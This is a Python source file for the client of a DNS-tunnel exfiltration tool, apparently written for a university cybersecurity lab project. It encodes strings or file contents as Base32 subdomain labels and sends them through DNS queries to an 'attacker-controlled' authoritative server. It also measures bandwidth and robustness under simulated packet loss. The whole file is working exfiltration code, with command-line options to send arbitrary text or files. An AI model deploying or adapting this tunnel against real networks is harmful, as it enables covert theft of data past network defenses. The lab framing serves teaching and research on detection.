#!/usr/bin/env python3
"""
DNS Tunnel – Compromised Client
================================
Encodes arbitrary data as Base32 subdomains and transmits it via DNS
queries to the attacker-controlled authoritative server.

Usage
-----
  python client.py --demo          # run full demo + measurements
  python client.py --send "text"   # exfiltrate a specific string
  python client.py --measure       # collect metrics only
"""

import argparse
import base64
import os
import statistics
import subprocess
import sys
import time
from dataclasses import dataclass, field
from typing import List

import dns.message
import dns.query
import dns.rdatatype

# ── Configuration ─────────────────────────────────────────────
TUNNEL_DOMAIN = "tunnel.lab"
RESOLVER_IP   = "10.10.0.2"
SESSION_ID    = "s1"
CHUNK_SIZE    = 30    # Base32 chars per DNS label  (max 63)
INTER_QUERY   = 0.05  # seconds between queries   (~20 q/s)


# ── Encoding helpers ──────────────────────────────────────────

def b32_encode(data: bytes) -> str:
    return base64.b32encode(data).decode().rstrip("=").lower()

def b32_decode(s: str) -> bytes:
    pad = (8 - len(s) % 8) % 8
    return base64.b32decode(s.upper() + "=" * pad)

def chunkify(encoded: str, size: int) -> List[str]:
    return [encoded[i : i + size] for i in range(0, len(encoded), size)]


# ── Core send ─────────────────────────────────────────────────

@dataclass
class TxResult:
    payload_bytes: int
    total_chunks: int
    acked: int
    nacked: int
    duration: float
    bandwidth_bps: float = field(init=False)
    robustness: float    = field(init=False)

    def __post_init__(self):
        self.bandwidth_bps = self.payload_bytes / self.duration if self.duration else 0.0
        self.robustness    = self.acked / self.total_chunks if self.total_chunks else 0.0


def send_data(data: str, verbose: bool = True, session_id: str = SESSION_ID) -> TxResult:
    """
    Encode *data* and transmit it chunk by chunk as DNS A queries.
    Returns a TxResult with timing + success metrics.
    """
    payload = data.encode("utf-8")
    encoded = b32_encode(payload)
    chunks  = chunkify(encoded, CHUNK_SIZE)
    total   = len(chunks)

    if verbose:
        print(f"\n[TX] Payload: {len(payload)} B  "
              f"→  encoded: {len(encoded)} chars  "
              f"→  {total} queries")

    acked = 0
    nacked = 0
    t0 = time.monotonic()

    for seq, chunk in enumerate(chunks):
        qname = f"{chunk}.{seq}.{total}.{session_id}.{TUNNEL_DOMAIN}"
        try:
            req = dns.message.make_query(qname, dns.rdatatype.A)
            resp = dns.query.udp(req, RESOLVER_IP, timeout=2.0)
            if resp.rcode() == 0 and resp.answer:
                rdata = resp.answer[0][0]
                # ACK = 1.0.0.1
                if str(rdata) == "1.0.0.1":
                    acked += 1
                    if verbose:
                        print(f"  [{seq:03d}/{total-1:03d}] ACK  {chunk[:20]}…")
                else:
                    nacked += 1
            else:
                nacked += 1
        except Exception as exc:
            nacked += 1
            if verbose:
                print(f"  [{seq:03d}] FAIL – {exc}")

        time.sleep(INTER_QUERY)

    duration = time.monotonic() - t0
    result = TxResult(len(payload), total, acked, nacked, duration)

    if verbose:
        print(f"\n[TX] Done – {acked}/{total} ACKed  "
              f"| {result.bandwidth_bps:.2f} B/s  "
              f"| robustness {result.robustness*100:.1f}%  "
              f"| elapsed {duration:.2f}s")

    return result


def get_input_file_path(custom_path: str = None) -> str:
    if custom_path and os.path.isfile(custom_path):
        return custom_path
    candidate_paths = [
        "/data/input.txt",
        os.path.join(os.path.dirname(__file__), "..", "data", "input.txt"),
        os.path.join(os.path.dirname(__file__), "data", "input.txt"),
        "data/input.txt",
    ]
    for p in candidate_paths:
        if os.path.isfile(p):
            return p
    return "/data/input.txt"


def load_input_text(file_path: str = None) -> str:
    path = get_input_file_path(file_path)
    if os.path.isfile(path):
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    return "Progetto Cyber Security - Foundations of Cybersecurity"


def send_file(file_path: str, verbose: bool = True, session_id: str = SESSION_ID) -> TxResult:
    """Read a text file and transmit its contents through the DNS tunnel."""
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    if verbose:
        print(f"[TX] Reading input file '{file_path}' ({len(content.encode('utf-8'))} B)")
    return send_data(content, verbose=verbose, session_id=session_id)


# ── Metric measurements ───────────────────────────────────────

def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3, session_id: str = "bench_bw") -> dict:
    """
    Send payloads of increasing size and measure effective bandwidth.
    Repeats each size *runs* times; reports mean ± stdev.
    """
    print("\n" + "="*55)
    print("METRIC 1 – BANDWIDTH")
    print("="*55)
    results = {}
    for size in sizes:
        bws = []
        for r in range(runs):
            payload = "X" * size
            res = send_data(payload, verbose=False, session_id=session_id)
            bws.append(res.bandwidth_bps)
        avg = statistics.mean(bws)
        std = statistics.stdev(bws) if len(bws) > 1 else 0.0
        print(f"  Payload {size:>5} B  →  {avg:6.2f} ± {std:.2f}  B/s")
        results[size] = {"mean_bps": avg, "stdev_bps": std}
    return results


def measure_robustness(
    payload: str = None,
    loss_rates: List[int] = (0, 5, 10, 20),
    runs: int = 3,
    session_id: str = "bench_rob",
) -> dict:
    """
    Introduce artificial packet loss with tc-netem, transmit the target
    payload (from data/input.txt), measure delivery rate. Requires NET_ADMIN capability.

    tc netem is applied to the client's eth0 interface.
    """
    if payload is None:
        payload = load_input_text()

    source_path = get_input_file_path()
    source_info = source_path if os.path.isfile(source_path) else "default text"

    print("\n" + "="*55)
    print("METRIC 2 – ROBUSTNESS  (tc netem packet loss)")
    print(f"  Payload: {len(payload.encode('utf-8'))} B (from {source_info})")
    print("="*55)
    results = {}
    iface = "eth0"

    def _set_loss(pct: int):
        subprocess.run(
            ["tc", "qdisc", "del", "dev", iface, "root"],
            capture_output=True
        )
        if pct > 0:
            subprocess.run(
                ["tc", "qdisc", "add", "dev", iface, "root",
                 "netem", "loss", f"{pct}%"],
                check=True, capture_output=True
            )

    for loss in loss_rates:
        try:
            _set_loss(loss)
        except Exception as e:
            print(f"  [!] tc netem failed (loss {loss}%): {e}")
            continue
        robs = []
        for _ in range(runs):
            res = send_data(payload, verbose=False, session_id=session_id)
            robs.append(res.robustness)
        avg = statistics.mean(robs)
        print(f"  Loss {loss:2d}%  →  delivery rate {avg*100:5.1f}%")
        results[loss] = {"mean_delivery_rate": avg}

    # Reset
    subprocess.run(["tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
    return results


# ── Demo / entry point ────────────────────────────────────────

def run_demo():
    print("=" * 55)
    print("DNS TUNNEL  –  Lab Demo")
    print("=" * 55)

    print("\n── Step 1: Data exfiltration ──────────────────────")
    payload = load_input_text()
    source_path = get_input_file_path()
    source_info = source_path if os.path.isfile(source_path) else "sample text"
    print(f"[DEMO] Exfiltrating payload from {source_info} ({len(payload.encode('utf-8'))} B)...")
    send_data(payload, session_id=SESSION_ID)

    print("\n── Step 2: Measurements ───────────────────────────")
    bw_results  = measure_bandwidth(sizes=[64, 256, 1024], runs=3)
    rob_results = measure_robustness(payload=payload, loss_rates=[0, 5, 10, 20], runs=3)

    print("\n── Summary ────────────────────────────────────────")
    print("Bandwidth (B/s):")
    for sz, r in bw_results.items():
        print(f"  {sz:>5} B payload: {r['mean_bps']:.2f} ± {r['stdev_bps']:.2f} B/s")
    print("Robustness:")
    for loss, r in rob_results.items():
        print(f"  {loss:2d}% loss → {r['mean_delivery_rate']*100:.1f}% delivered")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="DNS Tunnel Client")
    p.add_argument("--demo",    action="store_true", help="Run full demo + measurements")
    p.add_argument("--measure", action="store_true", help="Collect metrics only")
    p.add_argument("--send",    metavar="TEXT",      help="Exfiltrate a specific string")
    p.add_argument("--file",    metavar="PATH",      help="Exfiltrate contents of a text file (or target for --measure)")
    args = p.parse_args()

    if args.measure:
        target_payload = load_input_text(args.file) if args.file else load_input_text()
        measure_bandwidth()
        measure_robustness(payload=target_payload)
    elif args.file:
        send_file(args.file)
    elif args.send:
        send_data(args.send)
    else:
        run_demo()
